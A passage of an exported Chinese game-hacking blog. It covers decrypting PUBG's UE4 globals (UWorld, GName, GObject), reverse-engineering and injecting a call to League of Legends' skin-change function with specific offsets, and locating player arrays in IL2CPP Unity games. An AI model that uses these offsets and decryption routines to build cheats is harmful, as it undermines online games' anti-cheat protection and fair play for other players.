src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>根据自写代码可知，赋值为加密操作，读值为解密操作。因此查看取值代码。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>根据游戏代码解密即可。</p>\n<ul>\n<li><strong>结论</strong></li>\n</ul>\n<p>用到的加密数据附近必定有解密代码。</p>\n<h1 id=\"2、PUBG解密\"><a href=\"#2、PUBG解密\" class=\"headerlink\" title=\"2、PUBG解密\"></a>2、PUBG解密</h1><ul>\n<li><strong>Uworld</strong></li>\n</ul>\n<p>利用字符串<code>SeamlessTravel FlushLevelStreaming</code>定位到代码如下：</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>根据官方源码可知，<code>Uworld</code>在附近，但是这里看到是一个<code>CALL</code>，因此交叉引用后分析外层,得到下图结果。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>可知<code>Uworld</code>来自<code>(_QWORD *)(v1 + 160)</code>，但是这里并不是一个全局变量。看到上边<code>sub_7FF77B03EE38</code>有对v1+160操作，因此进去看看。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>发现代码调用了<code>off_7FF77E5E7720</code>对a2，也就是<code>Uworld</code>进行了处理，下边又调用了<code>off_7FF77E5E7728</code>对处理后的数据进行二次处理。由于该处是UE4引擎对Uworld的初始化，但是游戏本身对Uworld有加密操作。因此变量<code>qword_7FF77F9D96E0</code>为<code>Uworld</code>，函数<code>off_7FF77E5E7720</code>为加密函数，用于将加密后的数据赋值给<code>Uworld</code>，又因为此处需要用到<code>Uworld</code>，所以游戏又给他解密了，<code>off_7FF77E5E7728</code>为解密函数。为啥不直接用<code>a2</code>？别问，问就是不懂。</p>\n<ul>\n<li><strong>GName</strong></li>\n</ul>\n<p>利用字符串<code>ByteProperty</code>定位到代码如下：</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>从函数<code>sub_7FF778C03450</code>开始分析</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>可以看到<code>a2 / 0x40F0</code>，根据算法可以判定为<strong>0x40F0</strong>为<code>Chunk_Size</code>，而且这里应该是在计算类名。既然计算了类名，那么肯定是需要<code>GName</code>，看到代码对<code>a1</code>进行了解密，并且看到将v3(就是除法计算好的结构) * 8加上 一个解密结果,所以可知a1是GName（Gname算法），追a1。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>v2（也就是a1），被v1解密了一次，v1又从sub_7FF778C03830来，所以去这个函数里即可拿到GName。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<ul>\n<li><strong>GObject、Index</strong></li>\n</ul>\n<p>利用字符串<code>DebugCanvasObject</code>定位到代码如下：</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>很明显的一句<code>v7 = off_7FF77DFDA628(1212074649i64, qword_7FF77F9988A8) + 0x30i64 * v11;</code>，0x30是FObjectItem的结构大小，v11就相当于遍历的i（0~9999），这里是在获取GObject中的某一个对象。根据UObject成员可知，index为对象下标，所以Index的偏移为0x34，解密代码为：<code>v17 ^ (v17 &lt;&lt; 16) ^ 0xFC17596F</code>。</p>\n<ul>\n<li><strong>Class、Outer、FName</strong></li>\n</ul>\n<p>利用字符串<code>CopyPropertiesForUnrelatedObjects</code>定位到代码如下：</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>对应官方代码为：</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>由于GetFullName有获取Class，Outer，FName的成员，因此进入该函数寻找解密和偏移。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>对比源代码分析后得到如下结果。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n","categories":["UnrealEngine"]},{"title":"关于LOL动态皮肤修改的逆向与实现","url":"/2024/04/21/%E5%85%B3%E4%BA%8ELOL%E5%8A%A8%E6%80%81%E7%9A%AE%E8%82%A4%E4%BF%AE%E6%94%B9%E7%9A%84%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%9E%E7%8E%B0/","content":"<h1 id=\"关于LOL动态皮肤修改的逆向与实现\"><a href=\"#关于LOL动态皮肤修改的逆向与实现\" class=\"headerlink\" title=\"关于LOL动态皮肤修改的逆向与实现\"></a>关于LOL动态皮肤修改的逆向与实现</h1><p>• <a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2018-12-3 09:18</p>\n<p>第一次在看雪这种地方发这种帖子，心里很动荡不安。因为我本身很菜，所以有哪里不足的请大佬多多包涵并指出。</p>\n<p>最近莫名其妙又染上LOL这个游戏了，然后突然想到之前网上的动态换肤辅助，所以就打算下载一个然后搞搞事，最后虽然是弄出来了，但是因为技术比较差。在实现方面会因为和游戏主线程冲突，导致游戏崩掉（原因看文章结尾）。下面我开始上分析。<strong>Ps：本人技术以及表达能力都很差，请大家见谅。(因为在写这篇文章的时候，我是一边分析一边写这篇文章所以游戏可能是已经结束的状态。但是如果有需要调试游戏的话，我会重新打开游戏进行调试，所以会发现有一些图片和数据是不一样的，重要的是分析)</strong></p>\n<p>在开始分析的时候，因为我以前搞过这游戏，所以我知道这个实现动态换皮肤是需要一个皮肤ID的。所以我就直接打开下载好的辅助，来进行找这个ID。</p>\n<p>辅助图片如下：</p>\n<p><img src=\"/../images/GameHacker/%E5%85%B3%E4%BA%8ELOL%E5%8A%A8%E6%80%81%E7%9A%AE%E8%82%A4%E4%BF%AE%E6%94%B9%E7%9A%84%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%9E%E7%8E%B0/Untitled.png\" alt=\"Untitled\"></p>\n<p>在这里先说一下如何去找一个<code>英雄皮肤ID</code>，所谓的英雄皮肤ID指的是某个英雄他的皮肤数从0开始算，比如【暗裔剑魔】有4个皮肤，那么他的皮肤ID就是0(默认皮肤)、1、2、3。如下图：</p>\n<p>![Untitled%201](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 1.png)</p>\n<p>于是我在寻找这个ID的时候就是按照这种方法来寻找，因为默认皮肤的ID为0，所以我通过辅助来换到下一个皮肤的时候，我搜索1，这样慢慢的搜索，最后就会剩下一个我们需要的地址。下面我以【剑圣】为例(搜索好了的)。</p>\n<p>![Untitled%202](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 2.png)</p>\n<p>然后我们右键访问这个地址，然后去自杀。因为在人物复活的时候皮肤CALL会访问这个皮肤ID来重新对皮肤进行初始化，然后我们就可以通过这个来找出皮肤CALL。下图是该地址在人物复活的时候被访问。</p>\n<p>![Untitled%203](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 3.png)</p>\n<p>现在出现了下面两条：</p>\n<blockquote>\n<p>00581B6B - 89 46 40  - mov [esi+0x40],eax        -1<br>00582CB7 - 8B 5F 40  - mov ebx,[edi+0x40]        -2</p>\n</blockquote>\n<p>我们选择第一条点击详细信息</p>\n<p>![Untitled%204](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 4.png)</p>\n<p>我们会发现eax&#x3D;0，esi&#x3D;7DE7D2E8。回到游戏我们会发现我们原本换好的皮肤现在变成默认的皮肤了，也就是皮肤ID变成了0。然后还会发现esi+0x40&#x3D;7DE7D328，而7DE7D328这个地址刚刚好就是我们搜索出来的皮肤ID地址，就是说我们在复活的时候游戏会把0赋值给我们的皮肤ID地址，让我们的皮肤变成默认的皮肤。那么这个地方很可能就是一个皮肤CALL的传参关键。。。。。然后我们看第二条，一样查看详细信息。</p>\n<p>![Untitled%205](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 5.png)</p>\n<p>发现edi&#x3D;7DE7D2E8，然后把edi+0x40的值传进ebx，而这个edi+0x40刚好是我们搜索到的这个皮肤ID地址。可是我们来想一下，此时这个时候皮肤ID地址的值已经为0，说明游戏在执行到这个语句之前，皮肤ID的值已经被改变，就是说在执行到这条语句之前皮肤已经被修改过，所以这条语句不太可能是调用皮肤CALL之前的语句，而是在调用皮肤CALL之后的语句。<br>以上分析后，发现只有第一条。</p>\n<blockquote>\n<p>00581B6B - 89 46 40  - mov [esi+0x40],eax</p>\n</blockquote>\n<p>符合我们的要求，我们记录他的地址00581B6B，然后扔到OD里查看。</p>\n<p>![Untitled%206](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 6.png)</p>\n<p>我们打开OD，Ctrl+G输入我们记录的地址然后回车跳到这一行代码。有意思的地方到了，在反汇编窗口中可以看到在eax传进皮肤ID地址后，立即去执行了一个CALL，这个就引起了我们的注意，因为我上面说过，调用皮肤CALL需要的一个参数就是皮肤ID值。现在我们在这个CALL下一个断点，然后去送自杀，等待复活。<strong>注意：这个CALL需要在即将复活的那一瞬间下断，不然会被其他地方调用的时候断下，这个时候所返回的数据是不正确的。</strong></p>\n<p>![Untitled%207](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 7.png)</p>\n<p>当人物即将重生的时候游戏断了下来，看右边，EAX的值依然为0。这个时候往上看一下EAX的来源：</p>\n<blockquote>\n<p>mov eax,dword ptr ss:[esp+0x10]</p>\n</blockquote>\n<p>然后在我开始研究的时候，第一想法是去追这个esp的来源然后想直接通过找到的最终地址加上各种偏移来修改皮肤的，然后发现追不到。结果重新思考一下发现是没有必要的去追这个esp的，因为我直接可以在调用这段的时候给eax一个皮肤ID的值或者直接把皮肤ID的值传进皮肤ID地址(esi+0x40)里，然后直接调用下面的那个CALL就ojbk了。于是我就打算尝试直接调用这个CALL看看效果。为了弄懂调用这个CALL需要哪些参数的需要，我们继续分析。<br>这里先贴上这个部分的反汇编代码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00581B</span>67    <span class=\"number\">8B</span>CE            mov ecx,esi       </span><br><span class=\"line\"><span class=\"number\">00581B</span>69    <span class=\"number\">6</span>A <span class=\"number\">01</span>           push <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">00581B</span>6B    <span class=\"number\">8946</span> <span class=\"number\">40</span>         mov dword ptr ds:[esi+<span class=\"number\">0x40</span>],eax </span><br><span class=\"line\"><span class=\"number\">00581B</span>6E    E8 <span class=\"number\">1</span>D110000     call League_o<span class=\"number\">.00582</span>C90</span><br></pre></td></tr></table></figure>\n\n<p>首先：把esi传进了ecx，然后压入一个1，之后把eax传进[esi+0x40]，最后就直接去调用CALL。到发现这里没看到esi的值是哪里来的，所以要么esi的传值操作在上面，要么就在上一层。我们往上找看看有没有对esi赋值的语句。哟西,果然有</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00581B</span>48    <span class=\"number\">8B</span>F1            mov esi,ecx</span><br></pre></td></tr></table></figure>\n\n<p>把ecx的值传进esi，然后又发现上面没有对ecx的传值操作，那只能去上一层找。我们在程序头下断点，然后去自杀，等复活。等我们即将复活的时候断点断了下来，我们直接快捷键返回上一层，这个时候会看到有对ecx的传值操作。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0061E0</span>B0 - <span class=\"number\">8</span>D <span class=\"number\">8F</span> B8320000        - lea ecx,[edi+<span class=\"number\">0x32B8</span>]</span><br></pre></td></tr></table></figure>\n\n<p>![Untitled%208](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 8.png)</p>\n<p>我们在这里下一个断然后去自杀等复活，看看断下来的时候edi的值。</p>\n<p>![Untitled%209](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 9.png)</p>\n<p>edi&#x3D;5D395010，我们把这个值扔进CE去搜索一下 。</p>\n<p>![Untitled%210](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 10.png)</p>\n<p>会发现出现一个绿色的值，我们把它拉下来查看地址。</p>\n<p><strong>032A6DCC (“League of Legends.exe”+2EA6DCC)</strong></p>\n<p>那么<strong>032A6DCC</strong>这个估计就是人物地址了，所以</p>\n<p><strong>ecx&#x3D;[0x032A6DC]+0x32B8C   &#x2F;&#x2F; lea ecx,[edi+0x32B8]</strong></p>\n<p><strong>因为esi&#x3D;ecx，由此可知皮肤ID的地址&#x3D;[0x032A6DC]+0x32B8C+0x40</strong></p>\n<p>我们现在找出ecx的值了，我们返回到刚刚的这个位置。</p>\n<p>![Untitled%2011](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 11.png)</p>\n<p>现在我们回车进入到这个CALL里。</p>\n<p>![Untitled%2012](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 12.png)</p>\n<p>这个时候会发现在这个CALL里面有一条语句就是上面我们用CE调试的时候访问我们皮肤ID地址的语句。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00582</span>CB7 - <span class=\"number\">8B</span> <span class=\"number\">5F</span> <span class=\"number\">40</span> - mov ebx,[edi+<span class=\"number\">0x40</span>]</span><br></pre></td></tr></table></figure>\n\n<p>而这一条语句是在皮肤ID已经传入皮肤ID地址这个操作后才执行的，这个时候我就估计这个是皮肤CALL的内部。刚刚那个外层就是调用这个CALL来实现更换皮肤的，并且EAX是一个皮肤ID。现在我们从程序头开始分析。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00582</span>C90    <span class=\"number\">83</span>EC <span class=\"number\">2</span>C         sub esp,<span class=\"number\">0x2C</span></span><br><span class=\"line\"><span class=\"number\">00582</span>C93    A1 D0D49E01     mov eax,dword ptr ds:[<span class=\"number\">0x19ED4D0</span>]</span><br><span class=\"line\"><span class=\"number\">00582</span>C98    <span class=\"number\">33</span>C4            <span class=\"keyword\">xor</span> eax,esp</span><br><span class=\"line\"><span class=\"number\">00582</span>C9A    <span class=\"number\">894424</span> <span class=\"number\">28</span>       mov dword ptr ss:[esp+<span class=\"number\">0x28</span>],eax</span><br><span class=\"line\"><span class=\"number\">00582</span>C9E    <span class=\"number\">53</span>              push ebx                                 </span><br><span class=\"line\"><span class=\"number\">00582</span>C9F    <span class=\"number\">55</span>              push ebp</span><br><span class=\"line\"><span class=\"number\">00582</span>CA0    <span class=\"number\">56</span>              push esi</span><br><span class=\"line\"><span class=\"number\">00582</span>CA1    <span class=\"number\">57</span>              push edi</span><br></pre></td></tr></table></figure>\n\n<p>从开头到这为止都没有问题，然后到</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00582</span>CA2 <span class=\"number\">8B</span>F9 mov edi,ecx</span><br></pre></td></tr></table></figure>\n\n<p>看一下这一句，把ecx的值传给edi，因为从程序头到这一行都没有为ecx传值操作，所以可知ecx是上一层传进来的，而我们已经分析出ecx的来源，所以ecx是一个参数。然后在往下看，发现都在不断的从edi+偏移里读取东西，而edi来源于ecx，那么可以确定之前找到那个绿色的地址就是人物地址，而[人物地址]+0x32B8应该是关于人物模型之类的，然后再加一个偏移就是对应的属性。然后继续往下分析，直到这个CALL结束(一路顺畅)。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00582E8</span>F    C2 <span class=\"number\">0400</span>         retn <span class=\"number\">0x4</span></span><br></pre></td></tr></table></figure>\n\n<p>发现retn 04 ，说明这个call就push了一个，就是之前那个1，到这里大部分都已经分析完了，现在我们来整理一下，这里贴上游戏调用这个CALL的原型：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00581B</span>63    <span class=\"number\">8B</span>4424 <span class=\"number\">10</span>     mov eax,dword ptr ss:[esp+<span class=\"number\">0x10</span>]    <span class=\"comment\">//从某个地方获取ID</span></span><br><span class=\"line\"><span class=\"number\">00581B</span>67    <span class=\"number\">8B</span>CE          mov ecx,esi   </span><br><span class=\"line\"><span class=\"number\">00581B</span>69    <span class=\"number\">6</span>A <span class=\"number\">01</span>         push <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">00581B</span>6B    <span class=\"number\">8946</span> <span class=\"number\">40</span>       mov dword ptr ds:[esi+<span class=\"number\">0x40</span>],eax   <span class=\"comment\">//传入皮肤ID</span></span><br><span class=\"line\"><span class=\"number\">00581B</span>6E    E8 <span class=\"number\">1</span>D110000   call League_o<span class=\"number\">.00582</span>C90   <span class=\"comment\">//调用CALL</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>人物基址&#x3D;0x032A6DC</strong></p>\n<p><strong>ecx&#x3D;esi&#x3D;[人物基址]+0x32B8</strong></p>\n<p><strong>皮肤ID的地址&#x3D;[人物基址]+0x32B8C+0x40</strong></p>\n<p><strong>调用CALL所需要的参数：</strong></p>\n<p><strong>ecx      &#x2F;&#x2F;通过mov把人物基址+0x32B8传入ecx</strong></p>\n<p><strong>1          &#x2F;&#x2F;通过push压入</strong></p>\n<p><strong>皮肤ID  &#x2F;&#x2F;通过mov传进皮肤ID地址([人物基址]+0x32B8C+0x40&#x3D;ecx+0x40)</strong></p>\n<p>最后来测试一下，其中这一句我们就不用加入到代码了。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00581B</span>63 <span class=\"number\">8B</span>4424 <span class=\"number\">10</span> mov eax,dword ptr ss:[esp+<span class=\"number\">0x10</span>]</span><br></pre></td></tr></table></figure>\n\n<p>我们只直接给皮肤ID地址传进一个ID值。</p>\n<p>![Untitled%2013](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 13.png)</p>\n<p>在这里我换第二个皮肤，注入远程代码。</p>\n<p>![Untitled%2014](..&#x2F;images&#x2F;GameHacker&#x2F;关于LOL动态皮肤修改的逆向与实现&#x2F;Untitled 14.png)</p>\n<p>调用成功，那么这个CALL应该就是调用皮肤的CALL。</p>\n<p><strong>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></p>\n<p><strong>崩溃原因：如果你们跟着我这个文章一步一步操作的话，会发现在下断点的时候，我们人物即使在没死或者没有复活的情况下也会断下，为什么？因为游戏的主线程也在调用这一段代码，但是具体干什么用我不懂，所以如果你在调用这段换肤CALL的时候主线程刚好也在调用这段换肤CALL，那么这个时候就会撞车，主线程就会不知所措，游戏就会崩溃。如何解决这个，就你们自己弄了，这里就不讨论了。</strong></p>\n<p><strong>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></p>\n","categories":["GameHacker"]},{"title":"利用U3D引擎特性快递定位数组","url":"/2024/04/21/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/","content":"<h1 id=\"利用U3D引擎特性快递定位数组\"><a href=\"#利用U3D引擎特性快递定位数组\" class=\"headerlink\" title=\"利用U3D引擎特性快递定位数组\"></a>利用U3D引擎特性快递定位数组</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2021-8-18 15:11</li>\n</ul>\n<p>作为当代不争气的青年代表，在放弃挣扎前奋笔写下最后一篇文章，之后不问江湖事。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>IL2CPP我就不介绍了，显得水文字。搞过U3D的男人都懂，IL2CPP模式打包的游戏，游戏下面会存在一个名为<strong>global-metadata.dat</strong>的文件，这个东西解包之后会得到一个dump.cs和Mono模式下的所有DLL。那么综合网上大部分的教程来说，他们只会用dump.cs来看偏移，虽然直接用dnspy打开dll看也是可以的，但是dump.cs更偏向于sdk文件，可以直接把它的内容当作头文件来用，更加方便。接下来我将给大家带来一套组合拳，教大家如何正确的使用这个玩意来快速找到一个游戏的数组。这里插个题外话，标题虽然这次讲解的是针对IL2CPP,但是相对来说，Mono也是可以的，只不过在偏移和一些结构上面略显差异。</p>\n<p>老早时期，精力旺盛，在一次乱翻内存之中发现了u3d的一个惊天大秘密，然后经过一系列的操作和研究后就总结出了一套自己独有的使用方式。是这样的，u3d里的对象，假设对象地址是0x1000000000,那么在这个对象的某一个地方是会存着这个对象的类名，并且寻址的偏移还是固定的，之前查了一会，这玩意好像叫做反射。那么，这个有什么用捏？我这里先模拟一下传统的找数组方法：<strong>首先CE搜索人物的某项数据，比如坐标，然后一层一层往上跟到本人地址，然后通过访问本人地址或者扫指针，最后找出数组。</strong>这些看起来都是非常常规的方法，但是如果放到u3d游戏上来说是非常恶心的。众所周知，u3d有用的偏移大部分都是10层起步，像这种偏移量，先不说你有没有那个耐心用CE跟出来，就算你扫指针，那也是吃不消的，况且你还要去做数据对比。所以说整个流程下来，即使你找到数组，那也是累得半死的。这个时候，类名就派上用场了。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>我们知道凡是U3D打包的游戏，源代码基本都在<strong>Assembly-CSharp.dll</strong>这个DLL里，那么我们可不可以大胆猜测一下，<strong>游戏有一个主管理器类，里面存放着很多数据，其中就包括玩家数组，模型数组之类的，然后我们通过用DnSpy这个工具来找到这个类在游戏的实际名字，最后通过搜索类名的方法，反推到对象名</strong>。上面我提到过了，对象到类名的偏移是固定的，那么找到类的实例对象就相当于做小学加减法。存在既合理，下面开干。这里用的是<strong>枪火重生</strong>这个游戏，我们用il2cppDumper把GM文件解包之后用DnSpy打开DLL。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>既然是找有玩家数组的类，我们第一步就是去找玩家类，玩家类可以通过玩家的属性去找，常见的是血量，对应的关键词大部分是<strong>HP,Health</strong>，这个游戏用的是HP。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><strong>左边表示成员，右边表示所在的类</strong>。放眼看去，只有<strong>PlayerProp</strong>符合我们的要求，我们双击后，左边的列表将会定位到该类，我们点击展开按钮查看内部的内容。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>发现里面都是一些属性，从类名也可以判断出这个是存放玩家属性的类而不是玩家类，并且应该是属于玩家类的一个成员，所以我们只需要查找那个类引用了<strong>PlayerProp</strong>这个类。对这个类右键点分析，在右下角点开被使用。</p>\n<p><img 